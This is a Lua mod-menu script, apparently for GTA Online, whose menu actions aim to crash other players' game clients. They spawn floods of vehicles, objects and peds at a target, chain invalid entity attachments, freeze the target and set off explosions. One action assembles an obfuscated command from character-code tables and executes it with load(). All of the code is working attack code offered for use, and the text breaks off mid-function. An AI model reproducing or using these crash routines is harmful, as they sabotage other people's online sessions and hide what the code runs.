    menu.action(collapse1, "夜夜笙歌", {"yeyeshengge"}, "", function()
        notification( "请等待5-10秒崩溃进程", colors.black)
        local crash_tbl = {"SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE","6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH","GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",}
        local crash_tbl_2 = {{17, 32, 48, 69},{14, 30, 37, 46, 47, 63},{9, 27, 28, 60}}
        local cur_crash_meth = ""
        local cur_crash = ""
            for a,b in pairs(crash_tbl_2) do
                cur_crash = ""
                for c,d in pairs(b) do
                    cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
            end
                cur_crash_meth = cur_crash_meth .. cur_crash
                end
        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
        local crash_str = ""
        for k,v in pairs(crash_table) do
            crash_str = crash_str .. string.char(crash_table[k])
        end
        local this_int = 1
        while this_int < 1000 do 
            this_int += 1
        end
        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. players.get_name(PlayerID) .. '\")')
        pcall(crash_compiled_func)
         notification( "夜夜笙歌---崩溃结束", colors.black)
    end)
    menu.action(collapse1, "招蜂引蝶", {"zhaofengyindie"}, "", function()
       zhaofengyindie_crash(PlayerID)
        notification( "招蜂引蝶---崩溃结束", colors.black)
    end)
    menu.action(collapse1, "放浪不羁", {"fanglangbuju"}, "", function()
       fanglangbuju_crashes(PlayerID)
        notification( "放浪不羁---崩溃结束", colors.black)
    end)
    menu.action(collapse1, "落拓不羁", {"luotuobuju"}, "", function()
           menu.trigger_commands("yeyeshengge " .. players.get_name(PlayerID))
           menu.trigger_commands("zhaofengyindie " .. players.get_name(PlayerID))
           menu.trigger_commands("fanglangbuju " .. players.get_name(PlayerID))
    end)
collapse2 = menu.list(player_removals, "组合崩溃(2)", {}, "夜幕全新组合崩溃")

function createObject(model, position)
    local object = entities.create_object(model, position, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    return object
end

function createVehicle(model, position)
    return CreateVehicle(model, position, 0)
end

function attachEntities(entity1, entity2)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(entity1, entity2, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
end

function collapseAndEnhance()
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local cord = getEntityCoords(getPlayerPed(PlayerID))
    local objects = {
        util.joaat("virgo"),
        util.joaat("osiris"),
        util.joaat("v_serv_firealarm"),
        util.joaat("v_serv_bs_cond"),
        util.joaat("v_serv_bs_foamx3"),
        util.joaat("v_serv_ct_monitor07"),
        util.joaat("v_serv_ct_monitor06"),
        util.joaat("v_serv_ct_monitor05"),
        util.joaat("v_serv_bs_gelx3"),
        util.joaat("v_serv_ct_monitor01"),
        util.joaat("v_serv_ct_monitor03"),
        util.joaat("v_serv_ct_monitor05"),
        util.joaat("v_serv_ct_monitor04"),
        util.joaat("windsor"),
        util.joaat("feltzer3"),
        util.joaat("metrotrain"),
        util.joaat("metrotrain"),
        util.joaat("metrotrain"),
        util.joaat("metrotrain"),
        util.joaat("metrotrain"),
        util.joaat("metrotrain")
    }  
    local objectsCreated = {}
    for i = 1, #objects do
        local object = createObject(objects[i], cord)
        table.insert(objectsCreated, object)
    end
    local vehicles = {
        -1323100960, -- towtruck
        -692292317, -- skylift
        4244420235, -- cargobob
        4244420235, -- cargobob2
        4244420235, -- cargobob1
        444583674 -- handler
    }  
    local vehiclesCreated = {}
    for i = 1, #vehicles do
        local vehicle = createVehicle(vehicles[i], cord)
        table.insert(vehiclesCreated, vehicle)
    end
    for i = 1, #vehiclesCreated do
        attachEntities(vehiclesCreated[i], objectsCreated[i])
    end
    local playerPed = PLAYER.GET_PLAYER_PED(PlayerID)
    local playerCoords = ENTITY.GET_ENTITY_COORDS(playerPed)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(playerCoords.x, playerCoords.y, playerCoords.z + 1, playerCoords.x, playerCoords.y, playerCoords.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    for i = 1, #objectsCreated do
        ENTITY.DETACH_ENTITY(objectsCreated[i], objectsCreated[i])
        entities.delete_by_handle(objectsCreated[i])
    end
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED(PlayerID), true)
    local trafficLights = {}
    util.request_model(-655644382) -- traffic lights
    util.request_model(1663218586)
    for i = 1, 20 do
        local object = entities.create_object(-655644382, v3.new(cord.x + math.random(-5, 5), cord.y + math.random(-5, 5), cord.z + math.random(-1, 0)))
        local object1 = entities.create_object(1663218586, v3.new(cord.x + math.random(-5, 5), cord.y + math.random(-5, 5), cord.z + math.random(-1, 0)))
        ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
        ENTITY.SET_ENTITY_ROTATION(object1, 0, 0, math.random(0, 360), 1, true)
        trafficLights[#trafficLights + 1] = object
        trafficLights[#trafficLights + 1] = object1
    end
    local stopLights = false
    util.create_tick_handler(function()
        if stopLights then
            return false
        end
        ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
    end)
    util.request_model(-891462355) -- buffalo
    util.request_model(3253274834) -- buffalo
    local vehicles = {}
    local crashVehicle = entities.create_vehicle(3253274834, cord, 0)
    local crashVehicle = entities.create_vehicle(-891462355, cord, 0)
    vehicles[#vehicles + 1] = crashVehicle
    VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(crashVehicle, "ICRASHU")
    VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
    for i = 1, 10 do
        vehicles[#vehicles + 1] = clone(crashVehicle)
    end
    util.yield(500)
    for i = 1, #vehicles do
        entities.delete_by_handle(vehicles[i])
    end
    util.yield(500)
    stopLights = true
    util.yield(500)
    for i = 1, #trafficLights do
        entities.delete_by_handle(trafficLights[i])
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(1663218586)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-891462355)
end
menu.toggle_loop(collapse2, "Collapse and Enhance2", {"collapse_enhance"}, "", function()
    collapseAndEnhance()
end)


    menu.action(collapse2, "灯火阑珊", {"denghuolanshan"}, "", function()
    notification( "请等待5-10秒崩溃进程", colors.black)
    if PlayerID ~= players.user() then
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local mdl = util.joaat("cs_taostranslator2")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = players.get_position(PlayerID)
    local mdl = util.joaat("mp_m_freemode_01")
    local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(PlayerID) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                wait(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                wait(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end
    while not STREAMING.HAS_MODEL_LOADED(mdl) do
        STREAMING.REQUEST_MODEL(mdl)
        wait(5)
    end
    local ped = {}
    for i = 1, 10 do 
        local coord = ENTITY.GET_ENTITY_COORDS(player, true)
        local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
        ped[i] = entities.create_ped(0, mdl, coord, 0)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
        WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
        ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
        wait(25)
    end
    wait(2500)
    for i = 1, 10 do
        entities.delete_by_handle(ped[i])
        wait(25)
    end
     notification( "灯火阑珊---崩溃结束", colors.black)
    end)
    menu.action(collapse2, "华灯初上", {"huadengchushang"}, "", function()
    notification( "请等待5-10秒崩溃进程", colors.black)
    menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(PlayerID))
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local cord = getEntityCoords(getPlayerPed(PlayerID))
    local object = entities.create_object(util.joaat("virgo"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("osiris"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_firealarm"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_bs_cond"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_bs_foamx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor07"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor06"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor05"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_bs_gelx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("feltzer3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor02"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("windsor"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor03"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("v_serv_bs_clutter"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))  
    local object = entities.create_object(util.joaat("metrotrain"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("metrotrain"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("metrotrain"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("metrotrain"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("metrotrain"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("metrotrain"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    pedp = players.user_ped(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    towtruck = CreateVehicle(-1323100960, pos, 0)
    skylift = CreateVehicle(-692292317, pos, 0)
    cargobob = CreateVehicle(4244420235, pos, 0)
    cargobob2 = CreateVehicle(4244420235, pos, 0)
    cargobob1 = CreateVehicle(4244420235, pos, 0)
    handler = CreateVehicle(444583674, pos, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob, skylift, 0, 0, 0, 0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob1, skylift, 0, 0, 0, -0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(handler, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob2, towtruck, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(skylift, pedp, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    wait(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
    entities.delete_by_handle(object)
    YeMuprotections5()
     notification( "华灯初上---崩溃结束", colors.black)
    end)
    menu.action(collapse2, '午夜魅影', {"wuyemeiying"}, "", function ()
    notification( "请等待5-10秒崩溃进程", colors.black)
    player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    veh = entities.get_all_vehicles_as_handles()
    for i = 1, #veh do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], 0, 0, 5)
    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 18, 777)
    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 17, 888)
    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 16, 999)
    end
    ped_task = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED(PlayerID), true)
    entities.create_object(0x9cf21e0f , ped_task, true, false) 
    local Rui_task = CreateVehicle(util.joaat("Ruiner2"), ped_task, ENTITY.GET_ENTITY_HEADING(TTPed), true)
    local ped_task2 = CreatePed(26 , util.joaat("ig_kaylee"), ped_task, 0)
    for i=0, 10 do
    local pedps = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    local allpeds = entities.get_all_peds_as_handles()
    local allvehicles = entities.get_all_vehicles_as_handles()
    local allobjects = entities.get_all_objects_as_handles()
    local ownped = players.user_ped(players.user())
    request_model(0x78BC1A3C)
    request_model(0x000B75B9)
    request_model(0x15F27762)
    request_model(0x0E512E79)
    CreateVehicle(0xD6BC7523,pedps,0)
    CreateVehicle(0x1F3D44B5,pedps,0)
    CreateVehicle(0x2A72BEAB,pedps,0)
    CreateVehicle(0x174CB172,pedps,0)
    CreateVehicle(0x78BC1A3C,pedps,0)
    CreateVehicle(0x0E512E79,pedps,0)
    for i = 1, #allpeds do
    if allpeds[i] ~= ownped then
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allpeds[i], 0, 0, 0)
    end
    end
    for i = 1, #allvehicles do
    if allvehicles[i] ~= ownvehicle then
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehicles[i], 0, 0, 0)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(allvehicles[i], 0, 0, 0)
    VEHICLE.SET_TAXI_LIGHTS(allvehicles[i])
    end
    end
    for i = 1, #allobjects do
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allobjects[i], 0, 0, 0)
    end
    wait()
    end
    PED.RESURRECT_PED(players.user_ped(PlayerID))
    wait(2000)
    entities.delete_by_handle(Rui_task)
    entities.delete_by_handle(ped_task2)
     notification( "午夜魅影---崩溃结束", colors.black)
    end)
    menu.action(collapse2, "夜幕笼罩", {"yemulongzhao"}, "", function()
           menu.trigger_commands("denghuolanshan " .. players.get_name(PlayerID))
           menu.trigger_commands("huadengchushang " .. players.get_name(PlayerID))
           menu.trigger_commands("wuyemeiying " .. players.get_name(PlayerID))
    end)
    collapse3 = menu.list(player_removals, "组合崩溃(3)", {}, "夜幕全新组合崩溃")
    menu.action(collapse3,"言灵*风王之瞳",{"yanlingfengwangzhitong"},"",function()
    notification( "请等待5-10秒崩溃进程", colors.black)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = players.get_position(PlayerID)
	local mdl = util.joaat("u_m_m_jesus_01")
	local veh_mdl = util.joaat("oppressor")
	local mdl = util.joaat("v_serv_ct_monitor07")
	local veh_md2 = util.joaat("v_serv_ct_monitor06")
	local veh_md3 = util.joaat("v_serv_ct_monitor05")
	pedp = players.user_ped(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
	util.request_model(veh_mdl)
    util.request_model(mdl)
	util.request_model(veh_md2)
    util.request_model(veh_md3)
    dune = CreateVehicle(410882957,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dune)
    dune1 = CreateVehicle(2971866336,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dune1)
    barracks = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks)
    barracks1 = CreateVehicle(444583674,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks1)
    dunecar = CreateVehicle(2971866336,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar)
    dunecar1 = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar1)
    dunecar2 = CreateVehicle(444583674,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar2)
    barracks3 = CreateVehicle(4244420235,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks3)
    barracks31 = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks31)
    barracks4 = CreateVehicle(4244420235,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks4)
    barracks32 = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks32)
    wait(4500)
    allvehs = entities.get_all_vehicles_as_handles()
	for i = 1, #allvehs  do
		vehhash = ENTITY.GET_ENTITY_MODEL(allvehs[i])
		if vehhash == 410882957 or vehhash == -42959138 or vehhash == 2971866336 or vehhash == 3602674979 or vehhash == 2025593404 or vehhash == -1323100960 or vehhash == 444583674 then
			entities.delete_by_handle(allvehs[i])
			wait(100)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				wait(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				wait(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
		    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
			end
         notification( "言灵*风王之瞳---崩溃结束", colors.black)
		end
	end
end)
    menu.action(collapse3, "言灵*烛龙", {"yanlingzhulong"}, "", function()   
    notification( "请等待5-10秒崩溃进程", colors.black)    
    menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(PlayerID))
    local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), true)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    my = PLAYER.GET_PLAYER_PED(players.user())
    mypos = ENTITY.GET_ENTITY_COORDS(players.user())
    tr2 = -1881846085
    yyddss = 3613262246
    SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    STREAMING.REQUEST_MODEL(tr2)
        while not STREAMING.HAS_MODEL_LOADED(tr2) do
            wait(1)
        end
        dell = entities.create_vehicle(tr2, mypos, 0)
        ENTITY.SET_ENTITY_VISIBLE(dell, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dell, my, 0, 0, 0, 0, 0, 0, 0, false, true, false, true, 0, true)
        ghost = PLAYER.GET_PLAYER_PED(PlayerID)
        ghost1 = ENTITY.GET_ENTITY_COORDS(ghost)
        ENTITY.FREEZE_ENTITY_POSITION(ghost, true)
        entities.create_object(yyddss, ghost1, 0)
        wait(400)
        for i = 1, 50 do
            youpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my, youpos.x, youpos.y, youpos.z, true, false)
            wait(20)
        end
    wait(20)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my,-75.28,-818.66,326.17)
    wait(4500)
     notification( "言灵*烛龙---崩溃结束", colors.black)
    end)
    menu.action(collapse3, "言灵*归墟", {"yanlingguixu"}, "", function ()
    local vehicles = {}
    notification( "请等待5-10秒崩溃进程", colors.black)
    plauuepos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    pedmy = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))	
    towtruck = CreateVehicle(-1323100960, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck, true)	
    ENTITY.FREEZE_ENTITY_POSITION(towtruck, true)	
    skylift1 = CreateVehicle(-692292317, pos, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(skylift1, true)	
    ENTITY.FREEZE_ENTITY_POSITION(skylift1, true)  
    towtruck2 = CreateVehicle(-442313018, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck2, true)	
    ENTITY.FREEZE_ENTITY_POSITION(towtruck2, true)
    scrap = CreateVehicle(-1700801569, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(scrap, true)	
    ENTITY.FREEZE_ENTITY_POSITION(scrap, true)					
    dinghy3	= CreateVehicle(509498602, pos,0)	
    ENTITY.SET_ENTITY_INVINCIBLE(dinghy3, true)	
    ENTITY.FREEZE_ENTITY_POSITION(dinghy3, true)		
    barracks = CreateVehicle(-823509173, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)	
    car_1 = CreateVehicle(1886712733, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck, true)	
    ENTITY.FREEZE_ENTITY_POSITION(towtruck, true)			
    car_2 = CreateVehicle(516990260, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck2, true)	
    ENTITY.FREEZE_ENTITY_POSITION(towtruck2, true)
    car_3 = CreateVehicle(887537515, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(scrap, true)	
    ENTITY.FREEZE_ENTITY_POSITION(scrap, true)					
    car_4	= CreateVehicle(3251507587, pos,0)	
    ENTITY.SET_ENTITY_INVINCIBLE(dinghy3, true)	
    ENTITY.FREEZE_ENTITY_POSITION(dinghy3, true)		
    car_5 = CreateVehicle(444583674, pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)	
    car = CreateVehicle(0x432EA949,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car,true)
    car2 = CreateVehicle(0x432EA949,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car2,true)
    car3 = CreateVehicle(0xFCFCB68B,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car3,true)
    car4 = CreateVehicle(0xFCFCB68B,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car4,true)
    car5 = CreateVehicle(0xFCFCB68B,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car5,true)
    car6 = CreateVehicle(0xFCFCB68B,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car6,true)
    car7 = CreateVehicle(0x1E5E54EA,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car7,true)
    car8 = CreateVehicle(0x33B47F96,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car8,true)
    car9 = CreateVehicle(0x1E5E54EA,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car9,true)
    car10 = CreateVehicle(0x78BC1A3C,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car10,true)
    car11 = CreateVehicle(0x78BC1A3C,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car11,true)
    car12 = CreateVehicle(0x8125BCF9,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car12,true)
    car13 = CreateVehicle(0x9AE6DDA1,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car13,true)
    car14 = CreateVehicle(0x9AE6DDA1,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car14,true)
    car15 = CreateVehicle(0xAC5DF515,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car15,true)
    car16 = CreateVehicle(0xAC5DF515,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car16,true)
    car17 = CreateVehicle(0xAC5DF515,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car17,true)
    car18 = CreateVehicle(0xAC5DF515,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car18,true)
    car19 = CreateVehicle(0X187D938D,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(car19,true)
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck2,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(scrap,towtruck, 0, 0, 0,0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dinghy3,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck,towtruck2, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car_1,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car_2,towtruck, 0, 0, 0,0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car_3,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
